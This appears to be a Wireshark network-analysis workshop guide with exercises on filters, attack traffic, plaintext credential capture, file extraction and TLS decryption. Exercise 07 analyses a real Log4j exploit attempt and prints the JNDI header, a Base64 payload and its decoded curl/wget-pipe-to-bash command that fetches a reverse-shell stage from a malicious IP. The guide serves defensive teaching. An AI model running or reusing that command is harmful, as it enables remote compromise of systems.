@@ -1,0 +1,312 @@
+******************************
+***** Wireshark Workshop *****
+******************************
+******* Version: 1.0.1 *******
+******************************
+***** -By: Matt Scheurer *****
+****** Twitter: @c3rkah ******
+************ and *************
+******* Micah K. Brown *******
+**** Twitter: @micahkbrown ***
+******************************
+******************************
+
+
+******************************
+******** Introduction ********
+******************************
+
+What is Wireshark?
+
+Wireshark is a cross-platform free and open-source packet analyzer, sometimes refered to as a network sniffer or packet sniffer. Wireshark is often used for network troubleshooting and analysis. Wireshark allows a person to capture packet data from a live network, or read packets from a previously saved packet capture (PCAP) file. Originally named "Ethereal", the project was re-branded in 2006 as "Wireshark" due to trademark issues. Re-branding was a blessing, since most of us couldn't agree on the "proper" pronunciation of "Ethereal" anyway.
+
+TShark is a command line packet analyzer, and part of the Wireshark family. There are a number of other free or open source packet capture utilities available such as TCPdump, WinDump, NetworkMiner, a couple of old sunset offerings from Microsoft (i.e., "Microsoft Network Monitor" and "Microsoft Message Analyzer / MMA"), and the built-in Windows Packet Monitor (Pktmon) to name several.
+
+When sharing security incident war stories, experienced security analysts and engineers sometimes insist, "PCAP, or it didn't happen!"
+
+
+******************************
+******* Scope / About: *******
+******************************
+
+The target audience for this 2-hour training workshop are those wishing to learn the operational basics of using Wireshark for network traffic analysis, with a focus towards network security. There is no way to teach participants deep network knowledge, or cover the most advanced features of Wireshark during the workshop's allotted time. The goal is to help participants get started towards using Wireshark, and put them on a path toward greater learning.
+
+
+******************************
+******** Exercise 00: ********
+******************************
+
+Navigating Wireshark
+--------------------
+
+Objective: Learn about the various components of the Wireshark interface.
+
+Lets go over highlights of the Wireshark application, menus, and most helpful features.
+
+Live capture review and demo: The instructor will perform a live packet capture using the following commands: "ping -c5 8.8.8.8" and "lynx google.com".
+
+The parts of Wireshark...
+
+"Packet List" pane: Summary of packet details
+"Packet Details" pane: OSI layer 2-7 data
+"Packet Bytes" pane: Hex and ASCII dump of the packet data
+
+Next, we'll review some commonly used menu options, which we'll revisit later in this workshop.
+
+
+******************************
+******** Exercise 01: ********
+******************************
+
+TCP and UDP packets
+-------------------
+
+Objective: Understand the differences between TCP and UDP packets.
+
+Background: Transmission Control Protocol (TCP) establishes a 3-way handshake (SYN, SYN-ACK, ACK) between hosts before data transmission begins. The TCP handshake process occurs when one system transmits a SYNchronize (SYN) packet to another system, which in-turn sends back a SYNchronize-ACKnowledge (SYN-ACK) packet to the origin system. The original system then sends an ACKnowledge (ACK) packet back to the remote system, and the connection is established. TCP is used where network reliability is the highest importance. The User Datagram Protocol (UDP) sends data without establishing a handshake, and is considered a connectionless protocol. UDP is often used where network speed of delivery is the highest importance.
+
+Let's compare and contrast PCAP's of both TCP and UDP traffic...
+
+Steps:
+
+1. Open the "1a)chargen-tcp.pcap" and the "1b)chargen-udp.pcap" files in Wireshark.
+2. Observe the 3-way SYN, SYN-ACK, ACK handshake in the "1a)chargen-tcp.pcap" TCP packet capture file.
+3. Note the lack of a handshake in the "1b)chargen-udp.pcap" file, and the minimal number and size of packets needed to send data via UDP.
+
+
+******************************
+******** Exercise 02: ********
+******************************
+
+Packet flow basics
+-----------------_
+
+Objective: Understand how to navigate through a packet capture and follow streams.
+
+Steps:
+
+1. Open the "2)&3)&6a)web-session.pcap" file in Wireshark.
+2. Type "tcp" in the display filter field and press Enter.
+3. Notice how ARP and other requests disappear from the "Packet List".
+4. Select packet number 9.
+5. Click on the "Go" menu and select "Go to Packet".
+6. Type "208" and click the "Go to Packet" button.
+7. Click on the "Go" menu and select "Next Packet in Conversation".
+8. Repeat step 5 a few more times, and note how the active packet jumps though the packet capture.
+9. Right click on packet number 211 and select the "Follow" menu, then click on "TCP Stream".
+10. Scroll through the stream window to review the contents, and then close the stream window.
+11. Right click on packet number 212 and select the "Follow" menu, then click on "HTTP Stream".
+12. Note how the HTTP stream is merely an encapsulated subset of the TCP stream in this example.
+
+
+******************************
+******** Exercise 03: ********
+******************************
+
+Analyzing packets
+-----------------
+
+Objective: Working with display filters and searching through PCAPs.
+
+1. Open the "2)&3)&6a)web-session.pcap" file in Wireshark.
+2. Type "udp" into the "Display Filter" and press Enter to see all the UDP packets.
+3. Replace the display filter with "http" and press Enter to see all the HTTP packets. 
+4. Replace the display filter with "ip.addr == 192.168.11.152" and press Enter to see communication both to and from the 192.168.11.152 IP address.
+5. Replace the display filter with "ip.src == 192.168.11.152" and press Enter to see only the communication from the 192.168.11.152 IP address.
+6. Replace the display filter with "http && ip.dst == 192.168.11.192" and press Enter to see only web browser requests to the 192.168.11.15=92 IP address.
+7. Click the "Find a packet" magnifying glass in the toolbar, ensure the selector is set to "String", then type "login.php" and press Enter.
+8. Note the GET address requested in the "Packet Bytes" pane is "/dvwa/login.php".
+9. Right click on packet number 212, and select the "Follow" menu, then click on "HTTP Stream".
+10. Locate the "Find" field at the bottom of the stream window, type in "login.php" and click the "Find Next" button several times to cycle through the multiple instances where "login.php" appears throughout the stream.
+
+
+******************************
+******** Exercise 04: ********
+******************************
+
+Suspicious TCP connections
+--------------------------
+
+Objective: Identify malicious traffic samples in the PCAPs.
+
+Part 1) Where did I put that bucket?
+
+1. Open the "4a)synner.pcap" file in Wireshark.
+2. Look through packets in the PCAP.
+3. Answer what is the destination IP and port in these packets?
+4. What source IP addresses do you see in these packets?
+5. Expand the "Transmission Control Protocol" item in the "Packet Details" pane.
+6. Scroll down to the TCP "Flags".
+7. Identify which flag is set?
+8. Answer if you see any "SYN-ACK" or "ACK" packets?
+9. Click on the "Statistics" menu, select "Endpoints", and review the list of addresses and number of packets associated with each.
+10. Consider what this information indicates.
+
+NOTE: The traffic identified is indicative of a SYN flood attack, which is a type of = Denial-of-Service (DoS) attack. The numerous Source IP addresses indicate that this is potentially a Distributed (DDoS) attack.
+
+Part 2) Random puzzle pieces without a picture
+
+1. Open the "4b)fragmented.pcap" file in Wireshark.
+2. Look through packets in the PCAP.
+3. Answer what is the destination IP and port in these packets?
+4. What source IP addresses do you see in these packets?
+5. Click on the "Statistics" menu, select "Endpoints", and review the list of addresses and number of packets associated with each.
+6. Consider what this information indicates.
+
+NOTES: The traffic identified is indicative of a fragmented packet flood attack, which may potentially lead to a Denial-of-Service (DoS) condition. The numerous Source IP addresses indicate that this is potentially a Distributed (DDoS) attack.
+
+Part 3) What do we have here?
+
+1. Open the "4c)noack.pcap" file in Wireshark.
+2. Type "tcp.flags.syn==1" into the display filter and press Enter.
+3. Scroll through the list of packets to get a sense of the volume of TCP SYN requests.
+4. Replace the display filter with "tcp.flags.syn==1 && tcp.flags.ack==1" and press Enter.
+5. Scroll through the list of packets to get a sense of the volume of TCP SYN-ACK requests.
+6. Replace the display filter with "tcp.flags.ack==1" and press Enter.
+7. Note that the majority of the display filter results are predominantly Reset (RST) responses.
+8. Clear out the display filter so it is blank and press Enter.
+9. Click on the "Statistics" menu and select "Conversations".
+10. Click on the "IPv4" tab.
+11. Identify the IP addresses corresponding with the most packets then "Close" the Conversations window.
+12. Type "ip.dst == 192.168.11.192" into the display filter and press Enter.
+13. Navigate through the packets noting the different destination port (Dst Port) numbers involved.
+14. Navigate back through the packets and note that the Source IP and ephemeral Source Port are consistent.
+15. Consider what this information indicates.
+
+NOTES: Many requests from a single source IP address to an unusually high number of destination ports on a remote host(s) is indicative of a port scan. The lack of legitimate "SYN-ACK" and "ACK" handshake responses is indicative of a stealthy scan. Stealthy scans may purposely use TCP half-open connection requests with incomplete handshakes as means of scanning a remote host(s) while attempting to avoid monitoring, detection, and/or alerting.
+
+
+******************************
+******** Exercise 05: ********
+******************************
+
+Plain text protocols and grabbing creds
+---------------------------------------
+
+Objective: Learn why plain text communication protocols are risky by stealing logon credentials.
+
+Background: Network communication protocols that either do not support encryption or have encryption enabled are known as plain text protocols. Some examples of plain text protocols include: File Transfer Protocol (FTP), finger, Hyper Text Transfer Protocol (HTTP), Telnet, Simple Mail Transfer Protocol (SMTP), older versions of the Simple Network Management Protocol (SNMP), and Post Office Protocol (POP/POP3) to name a handful.
+
+1. Open the "5)telnet.pcap" file in Wireshark.
+2. Type "telnet" into the display filter and press Enter.
+3. Right click on the first visible packet, and navigate to the "Follow" menu then click on "TCP Stream".
+
+NOTES: This reveals both the user's login username and password in plain text along with other easily readable telnet session details. The color coding in the Stream window is used to show which data was exchanged at either the "client" or "server" ends of the network communication. At the bottom of the Stream window, users have the option to view the "Entire Conversation" or select a one-sided directional view of the network communication.
+
+
+******************************
+******** Exercise 06: ********
+******************************
+
+Extracting objects and data
+---------------------------
+
+Objective: Extract files from packet captures.
+
+Part 1) Export image files from a PCAP 
+
+1. Open the "2)&3)&6a)web-session.pcap" file in Wireshark.
+2. Type "image-gif" into the display filter and press Enter to check for the presence of .gif image files.
+3. Replace the current display filter with "image-jfif" and press Enter to check for the presence of .jpg/.jpeg image files.
+4. Clear out the display filter and click Enter to see the entire PCAP.
+5. Click on the "File" menu.
+6. Select "Export Objects" then click on "HTTP..." from the sub-menu.
+7. Click on the "Content Type" column header to sort the list by file types.
+8. Find and click on the "owasp-logo-400-300.png" file in the list.
+9. Click on the "Preview" button to see the image file.
+
+NOTES: We can alternatively click "Save" to save an individual file, or click "Save All" to dump out all available HTTP data files within the PCAP.
+
+Part 2) Extracting other data files from a PCAP
+
+Steps:
+
+1. Open the "6b)ftp.pcap" file in Wireshark.
+2. Note that there is no option within the "File" > "Export Objects" menu for FTP traffic.
+3. Enter "ftp-data" as the display filter and press Enter.
+4. Right click on the first visible packet, and navigate to the "Follow" menu then click on "TCP Stream".
+5. Note the file name "4UrEarsOnly.mp3" at the top of the stream window.
+6. Change the "Show data as" menu from "ASCII" to "Raw".
+7. Click the "Save As" button and use the file name of "4UrEarsOnly.mp3" to save the file.
+8. Close out of Wireshark and play the "4UrEarsOnly.mp3" audio file in a suitable audio player to validate our file extraction worked.
+
+
+******************************
+******** Exercise 07: ********
+******************************
+
+Log4j exploit attempts
+----------------------
+
+Objective: Identify and unravel a real-world vulnerability exploit.
+
+Background on Log4j: Apache Log4j is a Java-based logging utility. A critical (CVSS 10/10) Remote Code Execution (RCE) vulnerability (CVE-2021-44228) exists in older releases of Apache’s Log4j software library. Sometimes this vulnerability is also referred to as "Log4Shell" or "Logjam". Log4j is very broadly used in a variety of consumer and enterprise services, websites, and applications. An unauthenticated remote threat actor could exploit this vulnerability to take control of an affected system through Remote Code Execution (RCE). Log4j uses the Java Naming and Directory Interface (JNDI) Application Programming Interface (API) to obtain naming and directory services from several available service providers such as: Lightweight Directory Access Protocol (LDAP), Common Object Services (COS), Java Remote Method Invocation (RMI) registry, Domain Name Service (DNS), and so forth. In the exploit, JNDI is leveraged to call on these naming and directory services to initiate a RCE on a vulnerable endpoint.
+
+1. Open the "7)jndi_exploit.pcap" file in Wireshark.
+2. Enter a display filter of "frame contains jndi" and Enter.
+3. Right click on the packet displayed and select the "Follow" menu, then click on "HTTP Stream".
+4. Note that the user-agent is "curl/7.64.1".
+5. Observing that the submitted "X-Api-Version" begins with "${jndi:ldap://", which is a strong indicator of a Log4j attack attempt.
+6. Note the referenced IP address (45.155.205.233) preceding the encoded command.
+7. Check on RIPE WHOIS (https://apps.db.ripe.net/db-web-ui/query?searchtext=45.155.205.233) to determine the geolocation country code (RU, which is Russia) for the IP.
+8. Search the VirusTotal database (https://www.virustotal.com/gui/ip-address/45.155.205.233) to see if any security vendors report the IP as being malicious.
+9. Note the Base64 encoded command in the packet: "KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8yMTYuMTY1LjExMy4xNzE6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMjE2LjE2NS4xMTMuMTcxOjgwKXxiYXNo"
+10. Decode the encoded command...
+
+On Linux:
+echo KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8yMTYuMTY1LjExMy4xNzE6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMjE2LjE2NS4xMTMuMTcxOjgwKXxiYXNo | base64 -d && echo ""
+
+Or through CyberChef:
+https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=S0dOMWNtd2dMWE1nTkRVdU1UVTFMakl3TlM0eU16TTZOVGczTkM4eU1UWXVNVFkxTGpFeE15NHhOekU2T0RCOGZIZG5aWFFnTFhFZ0xVOHRJRFExTGpFMU5TNHlNRFV1TWpNek9qVTROelF2TWpFMkxqRTJOUzR4TVRNdU1UY3hPamd3S1h4aVlYTm8
+
+11. Observe the decoded payload: "(curl -s 45.155.205.233:5874/216.165.113.171:80||wget -q -O- 45.155.205.233:5874/216.165.113.171:80)|bash"
+
+NOTES: Blocking the 45.155.205.233 malicious IP address is recommended in addition to patching to the latest Apache Log4j release in order to mitigate the vulnerability. In this example, the threat actors are attempting to exploit a known Log4j vulnerability, while also attempting to masquerade the malicious activity as a legitimate web socket request. Breaking down the command... The threat actors are attempting a silent web request to the malicious 45.155.205.233 IP address over port 80 using either curl or wget, depending on whichever command(s) is available on the victim's host. The second-stage malicious payload file is deceptively named "216.165.113.171:80", which is meant to appear as a normal web socket connection to a non-malicious IP address (216.165.113.171 / https://search.arin.net/rdap/?query=216.165.113.171) at NYU. In reality, the second-stage payload attempts to open a reverse-shell from the victim's targeted host back to the threat actor's Command and Control (C&C / C2) infrastructure. These Log4j exploits are sometimes called "Log4shell" attacks. The same malicious origin Russian IP address and payload have also been observed and reported elsewhere (i.e., https://twitter.com/ITSecurityguard/status/1469440865114406921).
+
+
+******************************
+******** Exercise 08: ********
+******************************
+
+Decrypting encrypted packet data
+--------------------------------
+
+Objective: Decrypt encrypted PCAP data.
+
+1. Open the "8)encrypted.pcap" file in Wireshark.
+2. Note the first 3 packets show the 3-way TCP handshake (SYN, SYN-ACK, ACK).
+3. Enter "http2" in the display filter and Enter.
+4. Note that there are no results available.
+5. Replace the current display filter with "frame contains wireshark" and press Enter.
+6. Note the result is a single TLS 1.3 encrypted packet.
+7. Click on "www.wireshark.org" in the "Packet Bytes" pane.
+8. Scroll up a little in the "Packet Details" pane and note the domain name is encapsulated inside TLS.
+9. Go to Wireshark preferences (Wireshark menu or the Edit menu, depending on host OS).
+10. Expand the "Protocols" menu then scroll down and select "TLS".
+11. Click the "Browse" button underneath "(Pre)-Master-Secret log filename".
+12. Select the "sslkeylogfile.log" file and click "Ok".
+13. Replace the current display filter with "http2" again and press Enter.
+14. Note that we now see our decrypted HTTP2 packets.
+15. Scroll down and click on packet number 57 where Info = "DATA[1] (text/html)".
+16. Drag the "Packet Bytes" pane up, and click on the "Uncompressed entity body" tab at the bottom of the pane to reveal the encoded and compressed web page source code.
+
+NOTES: A number of options are available to dump out TLS secret encryption keys, including at the endpoint host OS level. These secret keys are what enables us to decrypt packets to reveal those obfuscated packets and data within them. Without decryption, we would be unable to see details about the packet session.
+
+
+******************************
+************ Misc ************
+******************************
+
+Further Learning
+----------------
+
+We've covered a lot of ground in these lab exercises, but barely scratched the surface on the full capabilities of Wireshark. Here are some additional resources to continue learning more about computer networking and analyzing network traffic using Wireshark...
+
+"Communication Networks" Free eBook
+https://en.wikibooks.org/wiki/Communication_Networks
+NOTE: The steps covered in the "Ethereal (packet sniffer)" section are still applicable to Wireshark.
+
+"Wireshark Lab: HTTP" Lab
+https://www.ida.liu.se/~TDTS04/labs/2019/Wireshark_HTTP/default.html
+& "Computer Networking: A Top-Down Approach", (8th edition) free eBook
+https://gaia.cs.umass.edu/kurose_ross/wireshark.php
